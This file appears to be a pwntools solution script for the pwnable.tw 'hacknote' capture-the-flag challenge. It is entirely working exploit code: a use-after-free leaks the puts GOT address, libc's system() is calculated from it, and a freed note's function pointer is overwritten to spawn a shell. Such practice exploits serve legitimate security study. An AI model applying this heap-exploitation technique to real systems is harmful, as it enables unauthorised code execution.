from pwn import *

sh = remote('chall.pwnable.tw', 10102)
# sh = process('./hacknote')
elf = ELF('./hacknote')

libc = ELF('./libc_32.so.6')

def add_note(size, content):
    sh.recvuntil('Your choice :')
    sh.sendline('1')
    sh.recvuntil('Note size :')
    sh.sendline(str(size))
    sh.recvuntil('Content :')
    sh.sendline(str(content))

def delete_note(index):
    sh.recvuntil('Your choice :')
    sh.sendline('2')
    sh.recvuntil('Index :')
    sh.sendline(str(index))

def print_note(index):
    sh.recvuntil('Your choice :')
    sh.sendline('3')
    sh.recvuntil('Index :')
    sh.sendline(str(index))

print_puts = 0x0804862b
puts_got = elf.got['puts']

add_note(20, 'aaaa')
add_note(20, 'aaaa')
delete_note(0)
delete_note(1)

add_note(0x8, p32(print_puts) + p32(puts_got))
print_note(0)
puts_addr = u32(sh.recv(4))

puts_libc = libc.symbols['puts']
sys_libc = libc.symbols['system']
sys_addr = puts_addr - puts_libc + sys_libc

delete_note(2)
add_note(0x8, p32(sys_addr) + ';sh\x00')
print_note(0)

sh.interactive()
sh.close()